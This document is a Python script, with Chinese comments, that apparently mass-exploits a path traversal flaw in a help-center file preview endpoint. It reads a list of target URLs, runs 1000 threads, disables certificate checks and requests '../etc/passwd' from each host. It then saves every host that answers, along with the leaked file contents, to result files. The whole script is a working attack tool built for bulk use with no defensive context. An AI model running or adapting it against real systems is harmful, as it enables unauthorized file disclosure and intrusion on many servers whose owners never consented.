import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import requests
import threading
import queue

class ExploitThread(threading.Thread):
    def __init__(self, queue, file_lock, result_file, url_file):
        super(ExploitThread, self).__init__()
        self.queue = queue
        self.file_lock = file_lock
        self.result_file = result_file
        self.url_file = url_file

    def run(self):
        while True:
            if self.queue.empty():
                print("批量上传完毕")
                break
            target = self.queue.get(timeout=1)
            self.exploit(target)

    def exploit(self, target):
        try:
            target_url = target + "/api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd"
            headers = {
                'Host': target.replace('https://', '').replace('http://', ''),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            response = requests.get(target_url, headers=headers, verify=False, timeout=8)
            #if response.status_code == 200 and "<!DOCTYPE html>" not in response.text and "404" not in response.text:
            if response.status_code == 200 :
                with self.file_lock:
                    with open(self.result_file, 'a') as f:
                        f.write(f"URL: {target}\nResponse:\n{response.text}\n{'-'*60}\n")
                    with open(self.url_file, 'a') as f:
                        f.write(f"{target}\n")
                print(target + "\t\t漏洞存在！")
                print("响应内容如下：")
                print(response.text)
            else:
                print(target + "漏洞不存在或无法读取文件!")
        except Exception as e:
            print(target + "请求失败: " + str(e))

if __name__ == '__main__':
    file_path = "zgyd.txt"
    result_file = "well.txt"
    url_file = "urlwell.txt"
    threads_count = 1000  # 设置线程数
    threads = []
    Queue = queue.Queue()
    file_lock = threading.Lock()

    # 清空或创建结果文件
    with open(result_file, 'w') as f:
        f.write('')
    with open(url_file, 'w') as f:
        f.write('')

    # 读取文件并将URL加入队列
    with open(file_path, "r") as file:
        for line in file.readlines():
            url = line.strip()
            if url[:4] != "http":
                url = "https://" + url
            Queue.put(url)

    # 创建并启动线程
    for i in range(threads_count):
        threads.append(ExploitThread(Queue, file_lock, result_file, url_file))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    Queue.join()
